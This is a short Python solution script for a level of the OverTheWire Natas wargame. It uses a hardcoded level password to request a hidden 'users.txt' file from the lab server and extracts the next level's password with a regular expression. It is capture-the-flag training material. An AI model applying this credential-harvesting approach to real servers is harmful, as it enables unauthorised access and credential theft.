import requests
import re

url = "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"

def exp():
    r = requests.get(url, auth=('natas3', '3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH'), verify=False)
    if r.status_code == 200:
        password = re.findall('natas4:(.*)', r.text)[0]
        print("Password for natas4: " + password)

if __name__ == "__main__":
    exp()